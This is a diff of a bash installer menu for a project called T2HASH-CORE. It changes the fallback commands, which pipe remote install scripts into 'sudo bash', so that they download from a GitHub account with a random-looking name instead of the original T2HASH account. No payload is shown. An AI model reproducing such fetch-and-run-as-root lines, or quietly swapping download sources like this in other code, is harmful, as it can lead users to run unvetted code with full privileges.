@@ -38,8 +38,8 @@ while true; do
       if [[ -f "$SCRIPT_DIR/install-kharej.sh" ]]; then
         bash "$SCRIPT_DIR/install-kharej.sh"
       else
-        curl -fsSL "https://raw.githubusercontent.com/T2HASH/T2HASH-CORE/main/install-kharej.sh" | sudo bash || \
-        (git clone https://github.com/T2HASH/T2HASH-CORE.git /tmp/t2core && bash /tmp/t2core/install-kharej.sh)
+        curl -fsSL "https://raw.githubusercontent.com/dnjebeuifedihwdih/T2HASH-CORE/main/install-kharej.sh" | sudo bash || \
+        (git clone https://github.com/dnjebeuifedihwdih/T2HASH-CORE.git /tmp/t2core && bash /tmp/t2core/install-kharej.sh)
       fi
       break
       ;;
@@ -48,8 +48,8 @@ while true; do
       if [[ -f "$SCRIPT_DIR/install-iran.sh" ]]; then
         bash "$SCRIPT_DIR/install-iran.sh"
       else
-        curl -fsSL "https://raw.githubusercontent.com/T2HASH/T2HASH-CORE/main/install-iran.sh" | sudo bash || \
-        (git clone https://github.com/T2HASH/T2HASH-CORE.git /tmp/t2core && bash /tmp/t2core/install-iran.sh)
+        curl -fsSL "https://raw.githubusercontent.com/dnjebeuifedihwdih/T2HASH-CORE/main/install-iran.sh" | sudo bash || \
+        (git clone https://github.com/dnjebeuifedihwdih/T2HASH-CORE.git /tmp/t2core && bash /tmp/t2core/install-iran.sh)
       fi
       break
       ;;
@@ -58,7 +58,7 @@ while true; do
       if [[ -f "$SCRIPT_DIR/install-sanaei.sh" ]]; then
         bash "$SCRIPT_DIR/install-sanaei.sh"
       else
-        curl -fsSL "https://raw.githubusercontent.com/T2HASH/T2HASH-CORE/main/install-sanaei.sh" | sudo bash
+        curl -fsSL "https://raw.githubusercontent.com/dnjebeuifedihwdih/T2HASH-CORE/main/install-sanaei.sh" | sudo bash
       fi
       break
       ;;
